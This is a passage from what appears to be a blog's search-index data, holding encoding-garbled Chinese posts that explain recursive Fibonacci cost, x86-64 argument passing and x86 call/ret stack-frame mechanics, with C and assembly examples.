ˆçŠ¶æ€å¦‚å›¾ 0. æ­¤æ—¶é€’å½’æœ€å¤§çš„æ ˆæ·±åº¦æ˜¯ 4, å¦‚æœ n å€¼è¿‡å¤§, ä¼šå¾ˆå®¹æ˜“å‘ç”Ÿ Stack Overflow è¿™ç§é”™è¯¯. æ¯”æ–¹è¯´ fib(1000) ä¼šä¸€ç›´åˆ›å»ºåˆ° fib(2) è¿™ä¸ªæ ˆå¸§, é€’å½’æ‰ä¼šå¼€å§‹è¿”å›. fib(2) è¿”å› 1 ç»™ fib(3), fib(3) ä¿å­˜è¿™ä¸ªè¿”å›å€¼. f(2) æ ˆå¸§é”€æ¯. å¦‚å›¾ 1. fib(3) è°ƒç”¨ fib(2) å¦‚å›¾ 2. fib(2) è¿”å› 1 ç»™ fib(3), fib(3) å°† fib(2)è¿”å›å€¼å’Œ fib(1) çš„è¿”å›å€¼ç›¸åŠ . å¦‚å›¾ 3. fib(3) è¿”å› fib(2)è¿”å›å€¼å’Œ fib(1) çš„è¿”å›å€¼ç›¸åŠ çš„ç»“æœ. å¦‚å›¾ 4. æ•ˆç‡ä½åŸå› åˆ†æ è®¡ç®—çš„ç»“æœå¹¶æ²¡æœ‰ä¿å­˜. æ¯ä¸€æ¬¡è¿›å…¥é€’å½’ä¹‹åéƒ½æ˜¯ä»åŸºæœ¬çš„ fib(2) å’Œ fib(1) å‘ä¸Šè¿”å›. ä¸­é—´ä¼´éšç€å¤§é‡çš„æ ˆå¸§åˆ›å»ºå’Œé”€æ¯, ä»¥åŠé‡å¤çš„å‡½æ•°è®¡ç®—.å‡½æ•°æ ˆå¸§çš„åˆ›å»ºå’Œé”€æ¯æ˜¯è€—æ—¶çš„æ“ä½œ, è¿™å¯å°±å¾ˆæ…¢äº†. fib(n) å¼€è¾Ÿæ ˆå¸§æ€»æ•°é‡å¯ä»¥è¡¨ç¤ºä¸º: sum(n) = 2^(n - 2) + 1 (n \u003e= 3). æ—¶é—´å¤æ‚åº¦æ˜¯: O(2^n) è¿è¡Œæ—¶é—´æµ‹è¯• #include \u003cstdio.h\u003e #include \u003cstdlib.h\u003e #include \u003ctime.h\u003e #define LENGTH 51 unsigned long fib(unsigned long n){ if(n \u003c= 2){ return 1; } return fib(n-1) + fib(n-2); } int main(){ unsigned long long result = 0; clock_t beginTime,endTime; beginTime = clock(); result = fib(LENGTH - 1); endTime = clock(); printf(\"Running Time %f Seconds\\n\",(double)(endTime - beginTime)/CLOCKS_PER_SEC); printf(\" %d :: %lu \\n\", LENGTH - 1, result); return 0; } fib(n) å¼€è¾Ÿæ ˆå¸§æ€»æ•°é‡å¯ä»¥è¡¨ç¤ºä¸º: sum(n) = 2^(n - 2) + 1 (n \u003e= 3). æ—¶é—´å¤æ‚åº¦æ˜¯: O(2^n) fib(50) å¼€è¾Ÿæ ˆå¸§æ€»é‡æ˜¯: sum(50) = 2^(48) + 1 æ—¶é—´å¤æ‚åº¦æ˜¯: O(2 ^ 50) è®¡ç®— fib(50) è´¹äº† 65 ç§’å·¦å³ è§£å†³æ–¹æ³• ç”¨æ•°ç»„ä¿å­˜å·²ç»è®¡ç®—å‡ºæ¥çš„ fib(n) çš„ç»“æœ. ä¿®æ”¹è®¡ç®—é€»è¾‘, å¦‚æœ fib(n) å·²ç»è¢«è®¡ç®—, ç›´æ¥ä½¿ç”¨, ä¸å†è¿›å…¥é€’å½’è®¡ç®—. è¿™å¯ä¸å°±æ˜¯æœ‰æ‹¿ç©ºé—´æ¢æ—¶é—´çš„æ„Ÿè§‰. ","é—®é¢˜æè¿°#é—®é¢˜æè¿°":" ç¬¬ä¸€ä¸ªæœˆåˆæœ‰ä¸€å¯¹åˆšè¯ç”Ÿçš„å…”å­ ç¬¬äºŒä¸ªæœˆä¹‹å(ç¬¬ä¸‰ä¸ªæœˆ)å®ƒä»¬å¯ä»¥ç”Ÿè‚² æ¯æœˆæ¯å¯¹å¯ç”Ÿè‚²çš„å…”å­ä¼šè¯ç”Ÿä¸‹ä¸€å¯¹æ–°å…”å­ å…”å­æ°¸ä¸æ­» é—®ç¬¬ n æœˆæœ‰å¤šå°‘å¯¹å…”å­?"},"title":"asm-how-recursion-function-execute"},"/blog/asm-how-x86-64-arguments-pass/":{"data":{"":"","#":"","c-main#C main":"","reference#Reference":"x86-64 ä¸‹å‡½æ•°å‚æ•°ä¼ é€’, æ±‡ç¼–å±‚é¢åˆ†æ To pass parameters to the subroutine, we put up to six of them into registers (in order: rdi, rsi, rdx, rcx, r8, r9).\nIf there are more than six parameters to the subroutine, then push the rest onto the stack in reverse order (i.e. last parameter first)\nâ€“ since the stack grows down, the first of the extra parameters (really the seventh parameter) parameter will be stored at the lowest address (this inversion of parameters was historically used to allow functions to be passed a variable number of parameters).\nä»£ç åˆ†æC main int main(){ int result = 0; result = testArgs(1,2,3,4,5,6,7,8); return 0; } Asm main gcc -o main main.c\nmain: pushq %rbp movq %rsp, %rbp subq $16, %rsp movl $0, -4(%rbp) ;result pushq $8 ; æœ€åä¸€ä¸ªå‚æ•° pushq $7 ; å€’æ•°ç¬¬äºŒä¸ªå‚æ•° movl $6, %r9d ; ç¬¬å…­ä¸ªå‚æ•° movl $5, %r8d ; ç¬¬äº”ä¸ªå‚æ•° movl $4, %ecx ; ç¬¬å››ä¸ªå‚æ•° movl $3, %edx ; ç¬¬ä¸‰ä¸ªå‚æ•° movl $2, %esi ; ç¬¬äºŒä¸ªå‚æ•° movl $1, %edi ; ç¬¬ä¸€ä¸ªå‚æ•° call testArgs(long, long, long, long, long, long, long, long) addq $16, %rsp ; å›æ”¶åˆ†é…çš„æ ˆç©ºé—´ movl %eax, -4(%rbp) movl $0, %eax leave ret C testArgs int testArgs(long a1,long a2,long a3,long a4,long a5,long a6,long a7,long a8){ long sum = 0; sum = a1 + a2 + a3 + a4 +a5 + a6 + a7 + a8; return sum; } Asm testArgs testArgs(long, long, long, long, long, long, long, long):\rpushq %rbp\rmovq %rsp, %rbp\rmovq %rdi, -24(%rbp) ; a1 æ ˆåº•\rmovq %rsi, -32(%rbp) ; a2\rmovq %rdx, -40(%rbp) ; a3\rmovq %rcx, -48(%rbp) ; a4\rmovq %r8, -56(%rbp) ; a5\rmovq %r9, -64(%rbp) ; a6\rmovq $0, -8(%rbp) ; sum\rmovq -24(%rbp), %rdx ; a1\rmovq -32(%rbp), %rax ; a2\raddq %rax, %rdx ; rdx = a1 + a2\rmovq -40(%rbp), %rax ; a3\raddq %rax, %rdx\rmovq -48(%rbp), %rax ; a4\raddq %rax, %rdx\rmovq -56(%rbp), %rax ; a5\raddq %rax, %rdx\rmovq -64(%rbp), %rax ; a6\raddq %rax, %rdx\rmovq 16(%rbp), %rax ; a7ï¼Œå…¶å®æ˜¯åˆ° main çš„æ ˆå¸§é‡Œå–çš„,main å‡†å¤‡çš„å‚æ•°,å› ä¸º rbp å°±æ˜¯ stack frame çš„æ ˆåº•\raddq %rax, %rdx\rmovq 24(%rbp), %rax ; a8ï¼Œå…¶å®æ˜¯åˆ° main çš„æ ˆå¸§é‡Œå–çš„,main å‡†å¤‡çš„å‚æ•°\raddq %rdx, %rax\rmovq %rax, -8(%rbp) ; sum = rax\rmovq -8(%rbp), %rax ; rax = sum ä¹Ÿå°±æ˜¯è¿”å›å€¼\rpopq %rbp\rret ç»¼ä¸Šå¯çŸ¥ï¼Œç¼–è¯‘å™¨é»˜è®¤ä¼šå°†æ‰€æœ‰çš„å‚æ•°å¤åˆ¶åˆ°æ ˆä¸Šã€‚\næ ˆå¸§åˆ†æ #(x86-64-arguments-pass) æ ˆé¡¶åœ¨ä¸‹æ–¹\nä¸Šå›¾æ˜¯æ‰§è¡Œå®Œ testArgs å‰ä¸¤å¥æ±‡ç¼–çš„æ ˆå¸§çŠ¶æ€å›¾.\nåˆ†æ: testArgs ä¸­ movq 16(%rbp), %rax ; å°† rbp + 16 åœ°å€å¤„çš„æ•°å€¼(å‚æ•° a7)å¤åˆ¶åˆ° rax\nrbp + 16 çš„åŸå› æ˜¯: å‚æ•° a7 æ˜¯ main å‡†å¤‡çš„, å±äº main çš„æ ˆå¸§.\n16 Bytes åŒ…æ‹¬ 8 Bytes çš„ Return address(main å‡½æ•°ä¸­çš„ call æŒ‡ä»¤å‹å…¥çš„ call æŒ‡ä»¤ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€)\nå’Œ 8 Bytes çš„ main çš„ rbp(testArgs å‡½æ•°ä¸­ç¬¬ä¸€æ¡æŒ‡ä»¤: pushq %rbp).\nReference callee-caller ","ä»£ç åˆ†æ#ä»£ç åˆ†æ":"","æ ˆå¸§åˆ†æ#æ ˆå¸§åˆ†æ":""},"title":"asm-how-x86-64-arguments-pass"},"/blog/asm-how-x86-function-execute/":{"data":{"addressing-modeå¯»å€æ¨¡å¼#addressing mode(å¯»å€æ¨¡å¼)":"","asm-execute-graph#asm execute graph":"","assembly-syntax-for-x86#assembly syntax for X86":"","bombs#bombs":"","c-compare-to--assembly#C compare to  Assembly":"","call#\u003ccode\u003ecall\u003c/code\u003e \u003clabel\u003e":"","call-stack#call stack":"","change-control-flowæ”¹å˜æ§åˆ¶æµ#change control flow(æ”¹å˜æ§åˆ¶æµ)":"","code-analysis#code analysis":"","direct-addressingç›´æ¥å¯»å€#direct addressing(ç›´æ¥å¯»å€)":"","example#example":"","function-call-and-return#function call and return":"","gas-gnu-assembler-syntax-ä¹Ÿå°±æ˜¯-att-é£æ ¼#gas (gnu assembler syntax), ä¹Ÿå°±æ˜¯ AT\u0026amp;T é£æ ¼.":"","indirect-addressingé—´æ¥å¯»å€#indirect addressing(é—´æ¥å¯»å€)":"","instruction-suffixes#instruction suffixes":"","intel-syntax#intel syntax":"","jmp-label#\u003ccode\u003ejmp\u003c/code\u003e label":"","popl-eax#\u003ccode\u003epopl\u003c/code\u003e %eax":"","program-counter-for-stored-program#program counter for stored program":"","pushl-eax#\u003ccode\u003epushl\u003c/code\u003e %eax":"","references#references":" å‰ä¸€é˜µå­å»çœ‹ java è™šæ‹ŸæœºåŸç†, å¿½ç„¶ç—›æ‚Ÿåˆ°è™šæ‹Ÿæœºä¹Ÿæ˜¯æœºå™¨å•Š, å‘µå‘µä¹Ÿå°±æ˜¯ä¸ªè½¯ä»¶è€Œå·². çœ‹åˆ° java æ–¹æ³•è°ƒç”¨å¤ªå¤æ‚. å­—èŠ‚ç é‚£ä¸€å¥—åˆä¸å¤ªç†Ÿæ‚‰, è¿˜ä¸å¦‚ç›´æ¥å»çœ‹ C ç¼–è¯‘åçš„æ±‡ç¼–ä»£ç . ç›®çš„: ææ˜ç™½ X86 æ¶æ„ä¸‹å‡½æ•°åˆ°åº•æ˜¯æ€ä¹ˆè°ƒç”¨æ‰§è¡Œçš„. è¿™å…¶å®å°±æ˜¯ Application Binary Interface ä¹‹ Function Calling Conventionsã€‚\nassembly syntax for X86gas (gnu assembler syntax), ä¹Ÿå°±æ˜¯ AT\u0026T é£æ ¼. æœ¬æ–‡é‡‡ç”¨è¯¥é£æ ¼.\nswap(int, int): pushq %rbp movq %rsp, %rbp movl %edi, -20(%rbp) movl %esi, -24(%rbp) movl -20(%rbp), %eax movl %eax, -4(%rbp) movl -24(%rbp), %eax movl %eax, -20(%rbp) movl -4(%rbp), %eax movl %eax, -24(%rbp) nop popq %rbp ret intel syntax swap(int, int):\rpush rbp\rmov rbp, rsp\rmov DWORD PTR [rbp-20], edi\rmov DWORD PTR [rbp-24], esi\rmov eax, DWORD PTR [rbp-20]\rmov DWORD PTR [rbp-4], eax\rmov eax, DWORD PTR [rbp-24]\rmov DWORD PTR [rbp-20], eax\rmov eax, DWORD PTR [rbp-4]\rmov DWORD PTR [rbp-24], eax\rnop\rpop rbp\rret instruction suffixes ç¼©å†™ å…¨ç§° ä½æ•° b byte 8bit w word 16bit l long 32bit q quad 64bit addressing mode(å¯»å€æ¨¡å¼) CPU å¯»å€æ–¹å¼, ä¹Ÿå°±æ˜¯æ‹¿åˆ°æ•°æ®çš„æ–¹å¼.\ndirect addressing(ç›´æ¥å¯»å€) movb $0x05,%al\nè¡¨ç¤ºä¸º:R[al] = 0x05;\nå°†ç«‹å³æ•° 0x05(1 byte) å¤åˆ¶åˆ°å¯„å­˜å™¨ al\nindirect addressing(é—´æ¥å¯»å€) é—´æ¥å¯»å€ä¹Ÿå°±æ˜¯åˆ°å†…å­˜é‡Œå»æ‰¾\nregister to memory movl %eax, -4(%ebp)\nè¡¨ç¤ºä¸º: mem[R[ebp]-4] = R[eax];\nå°†å¯„å­˜å™¨ eax é‡Œé¢çš„å€¼å¤åˆ¶åˆ°å¯„å­˜å™¨ ebp çš„å€¼å‡å» 4 æŒ‡å‘çš„å†…å­˜åœ°å€å¤„(ä¹Ÿå°±æ˜¯ R[ebp] -4 çš„å€¼æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€).\né€šè¿‡å¯„å­˜å™¨æŒ‡å‘äº†å†…å­˜åœ°å€, æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰çš„æŒ‡é’ˆå•Š, å¯¹, å°±æ˜¯æŒ‡é’ˆ. C è¯­è¨€çš„æŒ‡é’ˆå°±æ˜¯è¿™ä¹ˆç©çš„å•Š!\nmemory to register movl -4(%ebp), %eax\n%eax è¡¨ç¤ºä¸º: R[eax] = mem[R[ebp] -4];\nå°†å¯„å­˜å™¨ esp çš„å€¼å‡å» 4 çš„å€¼æŒ‡å‘çš„å†…å­˜åœ°å€å¤„å­˜æ”¾çš„å€¼, å¤åˆ¶åˆ°å¯„å­˜å™¨ eax\nprogram counter for stored program PC = PC + \\(instruction size in bytes\\)\n(instruction) (src1) (src2) (dst)\nIn most processors, the PC is incremented after fetching an instruction, and holds the memory address of (â€œpoints toâ€) the next instruction that would be executed.\nè¿™é‡Œå°±ç”¨åˆ°äº†æŒ‡ä»¤å‘¨æœŸ(instruction cycle)è¿™ä¸ªæ¦‚å¿µäº†, fetch, decode, execute. æ³¨æ„åˆ° PC è¿™ä¸ªå¯„å­˜å™¨, åœ¨ CPU fetch äº†ä¸€æ¡æŒ‡ä»¤åå°±è‡ªåŠ¨å¢åŠ äº†. (In a processor where the incrementation precedes the fetch, the PC points to the current instruction being executed.)\nåŒæ ·çš„åœ¨ CPU fetch ä¸€æ¡æŒ‡ä»¤ä¹‹å‰, PC æŒ‡å‘å½“å‰æ­£åœ¨æ‰§è¡Œçš„æŒ‡ä»¤.\næ³¨æ„: ä¸ç›´æ¥æ“ä½œ ip(instruction pointer) ä¹Ÿå« pc(program counter) è¿™ä¸ªå¯„å­˜å™¨, å¦‚æœè¿™ä¸ªèƒ½è¢«ç¼–è¯‘å™¨ç›´æ¥æ“ä½œçš„è¯, å°±å®Œå…¨æƒ³è·³åˆ°å“ªæ‰§è¡Œå°±è·³åˆ°å“ªæ‰§è¡Œäº†. å®é™…ä¸Š call å’Œ ret æŒ‡ä»¤å°±æ˜¯åœ¨é—´æ¥æ“ä½œ pc è¿™ä¸ªå¯„å­˜å™¨. call å¸¦æ¥çš„æ•ˆæœä¹‹ä¸€å°±æ˜¯ push %rip, ret å¸¦æ¥çš„æ•ˆæœä¹‹ä¸€å°±æ˜¯ pop %rip. ä¸¤è€…å…·æœ‰å¯¹ç§°ä½œç”¨å•Š!\nchange control flow(æ”¹å˜æ§åˆ¶æµ)jmp label When a jump instruction executes (in the last step of the machine cycle), it puts a new address into the PC. Now the fetch at the top of the next machine cycle fetches the instruction at that new address. Instead of executing the instruction that follows the jump instruction in memory, the processor â€œjumpsâ€ to an instruction somewhere else in memory.\njmp æŒ‡ä»¤æŠŠ label æ‰€åœ¨çš„åœ°å€, å¤åˆ¶ç»™ pc å¯„å­˜å™¨. è¿™å°±æ”¹å˜äº†ç¨‹åºçš„æ§åˆ¶æµ. ç„¶åç¨‹åºæµç¨‹å°±è„±ç¦»äº†åŸæ¥çš„æ‰§è¡Œæµ. å’Œ call label å¾ˆç›¸ä¼¼, å¯¹, call æŒ‡ä»¤ä½œç”¨ä¹‹ä¸€å°±åŒ…æ‹¬äº†ä¸€ä¸ªéšå¼çš„ jmp label. å‡½æ•°è°ƒç”¨ä¹Ÿå°±æ˜¯æŠŠæ§åˆ¶æƒäº¤ç»™äº†è¢«è°ƒç”¨è€…. ä½†æ˜¯æ§åˆ¶æƒæœ€åè¦å›åˆ°è°ƒç”¨å‡½æ•°é‚£é‡Œ. åªä¸è¿‡ call æŒ‡ä»¤åœ¨å‡½æ•°äº¤å‡ºæ§åˆ¶æƒä¹‹å‰è¿˜å¤šå¹²äº†ä¸€ä»¶äº‹, å°±æ˜¯æŠŠæ­¤æ—¶çš„ pc å€¼ push åˆ°äº†æ ˆé‡Œ.\nstack managementstack pointer A stack register is a computer central processor register whose purpose is to keep track of a call stack.\npush pop æŒ‡ä»¤æ“ä½œçš„æ˜¯ sp(stack pointer) è¿™ä¸ªå¯„å­˜å™¨.\næ ˆåº•åœ°å€: ç”±bp(base pointer) ä¿å­˜\næ ˆåˆ†é…ç©ºé—´: sp å‡å»éœ€è¦çš„åœ°å€ç©ºé—´å¤§å°(æ‰€è°“çš„æ ˆå‘ä¸‹ç”Ÿé•¿);\næ ˆå›æ”¶ç©ºé—´: sp åŠ ä¸Šéœ€è¦çš„åœ°å€ç©ºé—´å¤§å°(æ‰€è°“çš„æ ˆå‘ä¸Šæ”¶ç¼©);(PS: ç›¸å½“æ— èŠçš„è¯)\n#(x86-64-stack)\npushl %eax push value of %eax onto stack The push instruction places its operand onto the top of the hardware supported stack in memory. Specifically, push first decrements ESP by 4, then places its operand into the contents of the 32-bit location at address [ESP]. ESP (the stack pointer) is decremented by push since the x86 stack grows down - i.e. the stack grows from high addresses to lower addresses.\nè¿™é‡Œå¯ä»¥çœ‹åˆ° push çš„æ˜¯å¤šå­—èŠ‚çš„æ•°æ®, é‚£å°±æ¶‰åŠåˆ°æ€æ ·æ’åˆ—å¤šå­—èŠ‚æ•°æ®çš„é—®é¢˜äº†. ä¹Ÿå°±æ˜¯æ‰€è°“çš„å­—èŠ‚åºçš„é—®é¢˜. X86 é‡‡ç”¨æ‰€è°“çš„å°ç«¯, ä¹Ÿå°±æ˜¯æŠŠæ•°å­—æŒ‰ç…§é¡ºåºæ”¾åˆ°æ ˆé‡Œ, æ•°å­—çš„é«˜ä½æ”¾åœ¨äº†æ¯”è¾ƒå¤§çš„å†…å­˜åœ°å€é‚£é‡Œ.(è¿™é‡Œä¸åšè®¨è®º) ä½œç”¨ç­‰ä»·äº\nsubl $4, %esp ;åˆ†é…4ä¸ªå­—èŠ‚çš„ç©ºé—´, æ‰€è°“çš„æ ˆå‘ä¸‹ç”Ÿé•¿ movl %eax, (%esp) ;å°† eax çš„å€¼å¤åˆ¶åˆ° esp æŒ‡åˆ°çš„å†…å­˜åœ°å€å¤„ popl %eax pop %eax off stack The pop instruction removes the 4-byte data element from the top of the hardware-supported stack into the specified operand (i.e. register or memory location). It first moves the 4 bytes located at memory location [ESP] into the specified register or memory location, and then increments SP by 4. ä½œç”¨ç­‰ä»·äº\nmovl (%esp),%eax ;å°† esp æŒ‡å‘çš„å†…å­˜åœ°å€é‡Œé¢çš„å€¼å¤åˆ¶åˆ° eax addl $4,%esp ;å›æ”¶ç©ºé—´ function call and returncall The call instruction first pushes the current code location onto the hardware supported stack in memory(see the push instruction for details), and then performs an unconditional jump to the code location indicated by the label operand. Unlike the simple jump instructions, the call instruction saves the location to return to when the subroutine completes.\næ³¨æ„åˆ° CPU åœ¨ fetch åˆ° call æŒ‡ä»¤å, PC å°±å·²ç»è‡ªåŠ¨åŠ  1 äº†. æ­¤æ—¶çš„ PC å€¼ä¹Ÿå°±æ˜¯æ‰€è°“çš„å‡½æ•°è¿”å›åœ°å€. call æŒ‡ä»¤åšäº†ä¸¤ä»¶äº‹, ç¬¬ä¸€ä»¶äº‹: å°†æ­¤æ—¶çš„ ip ä¿å­˜åˆ°æ ˆä¸­, ç¬¬äºŒä»¶äº‹: jump åˆ° label ä½ç½®, æ­¤æ—¶å·²ç»æ”¹å˜äº† PC çš„å€¼.\ncall label ä½œç”¨ç­‰ä»·äº\npushq %rip jmp label ret The ret instruction implements a subroutine return mechanism. This instruction first pops a code location off the hardware supported in-memory stack (ä¹Ÿå°±æ˜¯ call æŒ‡ä»¤å‹å…¥æ ˆä¸­çš„ PC, å°†è¿™ä¸ªå€¼å¤åˆ¶åˆ° PC å¯„å­˜å™¨)(see the pop instruction for details). It then performs an unconditional jump to the retrieved code location.\næ‰€ä»¥å•Š, call(å«æœ‰ä¸€ä¸ª push æ“ä½œ) å’Œ ret(å«æœ‰ä¸€ä¸ª pop æ“ä½œ) æŒ‡ä»¤, è¿™æ˜¯å®ç°æ§åˆ¶æµè·³è½¬å’Œæ¢å¤çš„å…³é”®. ä¹Ÿé—´æ¥æ“ä½œäº† sp è¿™ä¸ªå¯„å­˜å™¨. ç¡¬ä»¶å®ç°çš„åŠŸèƒ½, ä¸éœ€è¦è¿‡å¤šçš„è®¡è¾ƒ.\nret\nä½œç”¨ç­‰ä»·äº:\npopq %rip call stack In computer science, a call stack is a stack data structure that stores information about the active subroutines of a computer program. This kind of stack is also known as an execution stack, program stack, control stack, run-time stack, or machine stack, and is often shortened to just â€œthe stackâ€.\nA call stack is used for several related purposes, but the main reason for having one is to keep track of the point to which each active subroutine should return control when it finishes executing.\nAn active subroutine is one that has been called but is yet to complete execution after which control should be handed back to the point of call. Such activations of subroutines may be nested to any level (recursive as a special case), hence the stack structure.\nexample for example, a subroutine DrawSquare calls a subroutine DrawLine from four different places, DrawLine must know where to return when its execution completes.\nTo accomplish this, the address following the instruction that jumps to DrawLine, the return address, is pushed onto the call stack with each call.\n#(callstack-layout-for-upward-growing-stacks)\ncode analysis void swap(int a, int b){ int tmp = a; a = b; b = tmp; } ; 64 bit æœºå™¨ , AT\u0026T é£æ ¼çš„æ±‡ç¼– swap(int, int): pushq %rbp ; ä¸Šä¸€ä¸ªæ ˆå¸§(main)çš„åŸºåœ°å€å‹æ ˆ ç­‰ä»·äº subq $8, %rsp; movq %rbp,(%rsp) movq %rsp, %rbp ; å¼€è¾Ÿæ–°çš„å‡½æ•°æ ˆå¸§, ä¹Ÿå°±æ˜¯å½¢æˆä¸€ä¸ªæ–°çš„æ ˆçš„åŸºåœ°å€ movl %edi, -20(%rbp) ; å‚æ•° a movl %esi, -24(%rbp) ; å‚æ•° b movl -20(%rbp), %eax ; æŠŠ a èµ‹å€¼ç»™ %eax movl %eax, -4(%rbp) ; æŠŠ %eax (a)èµ‹å€¼ç»™ %rbp - 4(a) çš„åœ°å€å¤„ movl -24(%rbp), %eax ; æŠŠ b èµ‹å€¼ç»™ % eaxï¼ˆbï¼‰ movl %eax, -20(%rbp) ; æŠŠ %eax (b) èµ‹å€¼ç»™ %rbp - 20ï¼ˆbï¼‰ çš„åœ°å€å¤„,å®Œæˆ b çš„äº¤æ¢ movl -4(%rbp), %eax ; æŠŠ %rbp - 4 åœ°å€å¤„çš„å€¼(a) èµ‹å€¼ç»™ %eax (a) movl %eax, -24(%rbp) ; æŠŠ %eax (a) èµ‹å€¼ç»™ %rbp - 24 çš„åœ°å€å¤„, å®Œæˆ a çš„äº¤æ¢ nop ; å»¶æ—¶ popq %rbp ; ç­‰ä»·äº movq (%rsp), %rbp ; ä¸Šä¸€ä¸ªå‡½æ•°æ ˆå¸§(main)çš„åŸºåœ°å€æ¢å¤; addq $8, %rsp ; ä¸Šä¸€ä¸ªå‡½æ•°çš„ %rsp æ¢å¤ ret ; 1. popq %rip. (æ¢å¤ main çš„ pc, call swap è¿™æ¡æŒ‡ä»¤å‹å…¥çš„ pc ) 2. jmp % rip å¤„ç»§ç»­æ‰§è¡Œ.(ä¹Ÿå°±æ˜¯ movl $0, %eax è¿™æ¡æŒ‡ä»¤çš„åœ°å€) int main() { swap(1, 2); return 0; } main: pushq %rbp movq %rsp, %rbp movl $2, %esi ; ç”± caller(main å‡½æ•°) å‡†å¤‡å‡½æ•°å‚æ•° 2 movl $1, %edi ; ç”± caller(main å‡½æ•°) å‡†å¤‡å‡½æ•°å‚æ•° 1 call swap ; åœ¨ CPU fetch äº† call æŒ‡ä»¤å, pc å·²ç»æŒ‡å‘äº†ä¸‹ä¸€æ¡æŒ‡ä»¤, ä¹Ÿå°±æ˜¯ movl $0, %eax è¿™æ¡æŒ‡ä»¤. æ­¤æ—¶çš„ call æŒ‡ä»¤å®Œæˆäº†ä¸¤ä»¶äº‹, ç¬¬ä¸€ä»¶äº‹: å°† pc(old) å‹å…¥åˆ°æ ˆä¸­(swap å‡½æ•° ret æŒ‡ä»¤(å‡½æ•°è¿”å›)å°±æ˜¯æŠŠè¿™ä¸ª pc(old) pop åˆ° pc è¿™ä¸ªå¯„å­˜å™¨, CPU å°±èƒ½æ¥ç€æ‰§è¡Œ movl $0, %eax è¿™æ¡æŒ‡ä»¤äº†), ç¬¬äºŒä»¶äº‹: jump åˆ°swapçš„åœ°å€, å¼€å§‹æ‰§è¡Œswapçš„ä»£ç . movl $0, %eax ; è¿”å›å€¼ 0 popq %rbp ret C compare to Assembly\nasm execute graph\næ³¨æ„: ç¤ºæ„å›¾é‡Œé¢çš„æ˜¯ 64 bit çš„æ±‡ç¼–ä»£ç .\næ³¨æ„: æ‰€æœ‰çš„ push å’Œ pop æŒ‡ä»¤éƒ½ä¼šæ”¹å˜ sp å¯„å­˜å™¨çš„å€¼.\nå›¾1 main å‡½æ•°æ‰§è¡Œå®Œ pushq %rbp å’Œ movq %rsp, %rbp, å¼€è¾Ÿ main å‡½æ•°çš„æ ˆå¸§.\nå›¾2 main å‡½æ•°æ‰§è¡Œ call swap. call æŒ‡ä»¤ä¸¤ä¸ªä½œç”¨: 1. å°† movl $0, %eax è¿™æ¡æŒ‡ä»¤çš„åœ°å€(X)å‹å…¥æ ˆä¸­. 2. jump åˆ° swap çš„åœ°å€.\nå›¾3 æ˜¯ swap å‡½æ•°çš„æ ˆå¸§, æ­¤æ—¶æ–°å‡½æ•°çš„æ ˆå¸§ rsp å’Œ rbp æŒ‡å‘çš„æ˜¯ç›¸åŒçš„å†…å­˜åœ°å€.\nå›¾4 æ‰€æœ‰çš„ mov ä½¿ç”¨çš„å†…å­˜åœ°å€, éƒ½æ˜¯é€šè¿‡ rbp æ¥åç§»å¾—åˆ°, rbp çš„å€¼å¹¶æ²¡æœ‰å‘ç”Ÿæ”¹å˜.\nå›¾5 æ‰§è¡Œå®Œ popq %rsp, æ¢å¤ main å‡½æ•°çš„æ ˆåŸºå€(rbp), ä¹Ÿå°±æ˜¯å’Œå›¾1 ä¸€æ ·.\nå›¾6 æ‰§è¡Œå®Œ ret æ¢å¤ä¸º main å‡½æ•°çš„æ ˆå¸§(è¿™é‡Œä¸»è¦æ˜¯ rsp, rbp, pc, ä¸ªäººç†è§£æŠŠ pc è§†ä¸ºæ ˆå¸§çš„ä¸€éƒ¨åˆ†, å› ä¸ºå‡½æ•°è°ƒç”¨æ§åˆ¶æƒå‘ç”Ÿè½¬ç§», å¹•åä¹Ÿç¦»ä¸å¼€ pc è¿™ä¸ªå¯„å­˜å™¨çš„å˜åŒ–).\nret çš„ä½œç”¨ç­‰ä»·äº popq %rip. ä½†æ˜¯æ— æ³•ç›´æ¥æ“ä½œ ip(pc) è¿™ä¸ªå¯„å­˜å™¨.\nä¹Ÿå°±ç›¸å½“äºé—´æ¥æ”¹å˜ ip. æ­¤æ—¶ pc å·²è¢« ret æŒ‡ä»¤æ¢å¤æˆäº† X. (æ­¤æ—¶å®é™…ä¸Šæ§åˆ¶æƒå·²ç»å›åˆ° main å‡½æ•°äº†), æ¥ä¸‹æ¥å°±æ˜¯ç»§ç»­æ‰§è¡Œ main å‡½æ•°çš„ä»£ç .\nå…¶å® swap å‡½æ•°çš„æ ˆå¸§å·²ç»è¢«é”€æ¯äº†. ä¹Ÿå°±æ˜¯å†ä¹Ÿè®¿é—®ä¸åˆ° swap å‡½æ•°é‡Œçš„å˜é‡äº†. è¿™å°±æ˜¯ C è¯­è¨€é‡Œçš„æ‰€è°“çš„æœ¬åœ°å˜é‡çš„æœ¬è´¨.\næ³¨æ„: å›¾1 å’Œ å›¾6 , å›¾2 å’Œ å›¾5 å®Œå…¨ä¸€æ ·, è¿™ä¸æ˜¯æœ‰æ„ä¸ºä¹‹, æŒ‰ç…§ X86 çš„å‡½æ•°è°ƒç”¨æœºåˆ¶å°±æ˜¯è¿™æ ·çš„. åœ¨è¢«è°ƒç”¨å‡½æ•°(swap)æ‰§è¡Œ popq % rbp, è¿™æ¡æŒ‡ä»¤å°±æ˜¯è¦æ¢å¤è°ƒç”¨å‡½æ•°(main)çš„ rbp, æ‰§è¡Œ ret è¿™æ¡æŒ‡ä»¤å°±æ˜¯è¦æ¢å¤è°ƒç”¨å‡½æ•°(main)çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€. ä¹Ÿå°±æ˜¯å°† pc çš„å€¼æ¢å¤ä¸º X, è¿™æ ·å°±å¯ä»¥æ¥ç€æ‰§è¡Œäº†å˜›. ä¹Ÿå°±æ˜¯æ‰€è°“çš„æ¢å¤è°ƒç”¨è€…(main)çš„æ ˆå¸§.\nä¹Ÿå°±æ˜¯ main å‡½æ•°è°ƒç”¨ swap å‡½æ•°(call æŒ‡ä»¤)ä¿ç•™ main çš„çŠ¶æ€(ä¹Ÿå°±æ˜¯ main å‡½æ•°çš„ rbp å’Œ pc), swap æ‰§è¡Œåˆ°æœ€å(popq, ret)è´Ÿè´£æ¢å¤ç°åœº(ä¹Ÿå°±æ˜¯æ¢å¤ main å‡½æ•°çš„ rbp å’Œ pc). call å’Œ ret æŒ‡ä»¤çš„ä¹Ÿåˆ†åˆ«æœ‰ push %rip å’Œ pop 